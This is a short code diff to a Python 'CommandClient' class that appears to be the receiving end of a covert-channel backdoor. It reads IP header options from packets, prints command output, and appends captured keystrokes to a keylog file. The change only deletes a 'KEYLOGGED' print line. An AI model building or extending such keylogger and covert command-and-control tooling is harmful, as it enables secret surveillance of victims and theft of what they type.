@@ -120,15 +120,12 @@ class CommandClient(object):
         ip_options = packet[IP].options[0]
 
         if ip_options.option == 6:
-
             print(str(packet[IP].options[0].value), end='')
             return
 
         if ip_options.option == 4:
             with open(self.keylog_filename, "a") as keylog_file:
                 keylog_file.write(str(ip_options.value))
-
-            print('KEYLOGGED: ' + str(ip_options.value))
         else:
             print(str(ip_options.option))
 
